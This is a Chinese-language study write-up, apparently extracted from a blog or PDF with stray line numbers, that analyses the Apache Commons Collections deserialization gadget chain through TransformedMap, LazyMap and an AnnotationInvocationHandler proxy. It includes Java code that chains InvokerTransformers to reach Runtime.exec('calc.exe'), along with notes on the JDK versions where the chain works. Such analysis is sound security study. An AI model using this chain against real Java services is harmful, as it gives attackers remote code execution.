33
34
35
36
解决方法，再传入一个ConstantTransformer对象，将值设为1，这样再次调用tranform方法时就会返回传入的1
这里有一个点就是，经过上面的构造链计算之后，Map中的所有键对应的值都会变成1。
PS：这里有一个点需要注意的，就是关于innerMap和outerMap的使用
此处使用innerMap首先存入数据，那么put数据的时候不会触发构造链，并且不会报上面的错误，并且下一步只会将ChainedTr
public class CommonCollections3 { 
    public static void main(String[] args) throws Exception { 
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{S
tring.class},new Object[]{"calc.exe"}); 
       // invokerTransformer.transform(Runtime.getRuntime()); 
//        Transformer[] transformers={
//            new ConstantTransformer(Runtime.getRuntime()),//ConstantTransformer传进去一个
对象，然后通过transform返回传进去的对象。这样在chainedTransformer链中就不需要传入一个对象。
//            invokerTransformer}; //此处因为Runtime类没有实现serializable接口，所以无法被反序
列化，需要修改链。 
        Transformer[] transformers={ 
            new ConstantTransformer(Runtime.class), 
            new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new 
Object[]{"getRuntime",new Class[0]}),//通过InvokerTransformer方法获取getRuntime方法 
            new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Ob
ject[]{null,new Object[0]}), 
            invokerTransformer, 
            new ConstantTransformer(1), 
        }; 
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); 
        chainedTransformer.transform(""); 
   }
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
ansformer赋值到outMap当中。
一开始使用outerMap存放数据，那么在put的时候就会触发构造链，并且会触发上面的报错。
关于AnnotationInvocationHandler
在通过var5.setValue的过程就会像我们之前分析的一样，有一个通过outermap进行添加元素的操作。仔细分析一下。
AnnotationInvocationHandler的调用与初始化
AnnotationInvocationHandler是JDK的内部类，不能通过new的方式来进行创建，所以此处使用java反射的方式进行调用。
第二部分，就是关于调用newInstance进行初始化。在这一步中，需要来阅读AnnotationInvocationHandler源码查看如何进
行初始化。
version:8u66 
private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException 
{ 
        var1.defaultReadObject(); 
        AnnotationType var2 = null; 
        try { 
            var2 = AnnotationType.getInstance(this.type); 
        } catch (IllegalArgumentException var9) { 
            throw new InvalidObjectException("Non-annotation type in annotation serial stre
am"); 
        } 
        Map var3 = var2.memberTypes(); 
        Iterator var4 = this.memberValues.entrySet().iterator(); 
        while(var4.hasNext()) { 
            Entry var5 = (Entry)var4.next(); 
            String var6 = (String)var5.getKey(); 
            Class var7 = (Class)var3.get(var6); 
            if (var7 != null) { 
                Object var8 = var5.getValue(); 
                if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) { 
                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() 
+ "[" + var8 + "]")).setMember((Method)var2.members().get(var6))); 
                } 
            } 
        } 
    }
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
Class aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); 
        Constructor constructor = aClass.getDeclaredConstructor(Class.class, Map.class); 
        constructor.setAccessible(true); 
        //Object obj = constructor.newInstance(Retention.class, outerMap); 
        //Retention.class; 
        InvocationHandler handler= (InvocationHandler)constructor.newInstance(Counter.class
, outerMap);
1
2
3
4
5
6
首先传递两个参数var1和Map，其中这个var1是一个Class类型且必须继承Annotation类。这里的Annotation类就是java的注解
了，java中所有的注解都继承自该类。且该类是个接口类型，无法直接创建子类。而且无法通过实现该接口，再继承的方式去实
现。
也就是这种方式创建是无法完成初始化的。
这里可以直接自定义一个注解，因为每一个注解都继承自Annotation类。
之后通过getInterfaces()方法获取到var1所实现的第一个接口对象。然后使用isAnnotation方法检查var1是不是Annotati
on注解类型，并判断获取到的第一个接口对象是不是Annotation类型。之后将AnnotationInvocationHandler类的type属性
赋值var1，memberValues属性赋值var2。
AnnotationInvocationHandler的反序列化
    AnnotationInvocationHandler(Class var1, Map var2) 
{ 
        Class[] var3 = var1.getInterfaces(); 
        if (var1.isAnnotation() && var3.length == 1 && var3[0] == Annotation.class) { 
            this.type = var1; 
            this.memberValues = var2; 
        } else { 
            throw new AnnotationFormatError("Attempt to create proxy for a non-annotation t
ype."); 
        } 
    }
1
2
3
4
5
6
7
8
9
class a implements Annotation{ 
    @Override 
    public Class annotationType() { 
        return null; 
    }
}
class b extends a{}
1
2
3
4
5
6
7
8
上图，readObject方法
首先是创建一个AnnotionType类型的变量var2，然后通过AnnotionType.getInstance方法获取到this.type的Class类对
象。这里的this.type属性根据之前的分析，就是我们传递的第一个变量，一个interface SecurityRambling.Counter。这
里的使用的AnnotationType.getInstance方法作用是获取注解类本身。
详细信息：AnnotationType类型介绍
之后可以看到获取到的var2变量的属性，其中memberTypes属性中保存的是当前注解拥有的方法。是一个HashMap类型。
@interface Counter { 
    test count(); 
    String a();
} 
enum test{ 
    CLASS, 
    SOURCE, 
    RUNTIME,
}
1
2
3
4
5
6
7
8
9
10
之后将memberTypes属性的值赋值给var3，然后创建一个迭代器，迭代器的内容就是之前存入的TransformedMap类型的值。
之后继续，对迭代器进行遍历。
此处可以看到，首先从迭代器取出一个值，赋值给var5，然后获取到var5的键为demo，之后在var3中寻找键名为demo的值，这
个var3存放的当前注解所有的接口方法。而当前接口没有一个名为demo的方法，因此var7为null，然后跳过setValue的步骤。
直接返回。
此处我们要想var7不为null，就必须在生成序列化链的时候，通过outermap存入一个键值，且键名必须为AnnotationInvocati
onHandler类初始化时传进去的注解的其中一个方法名。所以构造链应该如下：
继续调试。
此时var7不为null，进入到if结构当中，然后获取到var5的值，赋值给var8，可以看到var8为int类型的1，这个值与我们构造链
中的最后一次创建ConstantTransformer对象传递的值有关系，是我们可以人为控制的。然后通过两个判断，根据逻辑两个判
断都必须为false，才能进入到setValue方法。
第一个判断： 
java.lang.Class类的isInstance()方法用于检查指定的对象是否兼容分配给该Class的实例。如果指定对象为
非null，并且可以强制转换为此类的实例，则该方法返回true。否则返回false。 
用法: 
public boolean isInstance(Object object) 
参数：此方法接受object作为参数，这是要检查与此Class实例的兼容性的指定对象。 
返回值：如果指定对象为非null，并且可以强制转换为此类的实例，则此方法返回true。否则返回false 
1
2
3
4
5
6
7
8
此处var7为String类型，var8为Integer类型，两个判断都为False，进入到setValue方法。进入setValue方法之后还有一系
列的操作，最后在此处产生了类似outerMap.put()的操作，并触发构造链。
到此，整个构造链第一部分的分析结束。
LazyMap代替TransformedMap
原因
在高版本中AnnotationInvocationHandler类中的readObject方法被修改了，使用重新生成的LinkHashMap来进行数据操作，
因此反序列化的过程中不会再触发put的操作。
所以在yso中使用LazyMap对TransformedMap进行替换。
LazyMap
第二个判断 
instanceof 严格来说是Java中的一个双目运算符，用来测试一个对象是否为一个类的实例 
9
10
LazyMap也是通过decorate方法在创建对象的时候将factory属性赋值为chainedTransformer，之后通过get方法获取一个不
存在的键值对时就会通过factory方法去获取一个值，也就是在这个地方可以触发构造链。
public class LazyMap extends AbstractMapDecorator implements Map, Serializable { 
    private static final long serialVersionUID = 7990956402564206740L; 
    protected final Transformer factory; 
    public static Map decorate(Map map, Factory factory) { 
        return new LazyMap(map, factory); 
    } 
    public static Map decorate(Map map, Transformer factory) { 
        return new LazyMap(map, factory); 
    } 
    protected LazyMap(Map map, Factory factory) { 
        super(map); 
        if (factory == null) { 
            throw new IllegalArgumentException("Factory must not be null"); 
        } else { 
            this.factory = FactoryTransformer.getInstance(factory); 
        } 
    } 
    protected LazyMap(Map map, Transformer factory) { 
        super(map); 
        if (factory == null) { 
            throw new IllegalArgumentException("Factory must not be null"); 
        } else { 
            this.factory = factory; 
        } 
    } 
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundExceptio
n { 
        in.defaultReadObject(); 
        super.map = (Map)in.readObject(); 
    } 
    public Object get(Object key) { 
        if (!super.map.containsKey(key)) { 
            Object value = this.factory.transform(key); 
            super.map.put(key, value); 
            return value; 
        } else { 
            return super.map.get(key); 
        } 
    }
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
找到了LazyMap触发构造链的点，之后要考虑如何在反序列化的时候执行这个get方法，还是利用AnnotationInvocationHand
ler类，但是这个类的readObject方法是没有触发get方法的操作的。但是invoke()方法中有一个get的操作。
那么问题就转移到如何在反序列化的过程中执行这个invoke方法。
Java对象代理
详细可以看java代理类的学习。
自定义一个handle继承自InvocationHandler，然后实现invoke方法，劫持get方法的执行流程。 
class Handle implements InvocationHandler{ 
    protected  Map map; 
    public Handle(Map map) { 
        this.map = map; 
    } 
    @Override 
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { 
        if(method.getName().equals("get")){ 
            System.out.println("正在调用get方法"); //通过此次劫持get执行流程。 
            return "hack job"; 
        } 
        return method.invoke(map,args); 
    }
} 
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
重回LazyMap
还是来关注sun.reflect.annotation.AnnotationInvocationHandler类，可以发现他是一个本身就实现了
InvocationHandle接口的类，实现了invoke方法，那么我们只要创建一个outerMap的代理类，handler参数传递为sun.reflec
t.annotation.AnnotationInvocationHandler,那么我们就可以劫持outerMap执行get方法的流程。
        HashMap innerMap = new HashMap(); 
        Map outerMap = LazyMap.decorate(innerMap, chainedTransformer); 
        //outerMap.get(1); 
        //生成动态代理对象 
        Map proxyInstance = (Map)Proxy.newProxyInstance( 
            Map.class.getClassLoader(), 
            new Class[]{Map.class}, 
            new Handle(outerMap) 
        ); 
        outerMap.put("hello","world"); 
        Object hello = proxyInstance.get("hello"); 
        System.out.println(hello);
1
2
3
4
5
6
7
8
9
10
11
12
13
所以整个调用构造链的方法修改为如下形式：
        Class aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandle
r"); 
        Constructor constructor = aClass.getDeclaredConstructor(Class.class, Map.class); 
        constructor.setAccessible(true); 
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Counter.cla
ss, outerMap); 
        Map proxyMap =(Map) Proxy.newProxyInstance( 
            Map.class.getClassLoader(), 
            new Class[]{Map.class}, 
            handler  //将handler传递进去，之后sun.reflect.annotation.AnnotationInvocationHan
dler方法就会劫持原本的get方法。 
        ); 
        proxyMap.entrySet();//
1
2
3
4
5
6
7
8
9
10
11
最开始使用proxyMap.get(1)的方式来触发invoke，但是一直报错。
这个错误是在invoke方法中触发的，因为传递的是一个有参方法，经过getParameterTypes获取参数类型的时候不为0，所以
直接抛出异常。改为无参的方法再劫持就能成功触发构造链了。
经过劫持之后，outerMap对象已经变成了proxyMap对象了，现在就是要想办法再readObject方法中让这个proxyMap调用一个
无参方法，就可以完成整个构造链。回到sun.reflect.annotation.AnnotationInvocationHandler类的readObject方法当
中。
在readObject方法当中通过获取到memberValues属性值，赋值给var4，然后var4也调用了一个无参的方法。所以这个
readObject本身就可以满足要求，所以再创建一个AnnotationInvocationHandler对象，然后将其序列化就可以满足要求。
构造链调试和疑问
1、在jdk1.8.0_131中直接报错。在jdk1.8.0_66中成功弹计算机。
因为jdk版本跟新之后修改了AnnotationInvocationHandler的readObject方法，将其中的memberValue变量进行了修改，所
以在劫持内部过程，执行invoke函数的时候this.memberValue不再是LazyMap：
2、序列化的过程中序列化了两个AnnotationInvocationHandler对象，所以反序列化时会触发两次readObjet方法。使用两次
不一样的注解，清楚的看到两次反序列化。
第一次：
第二次：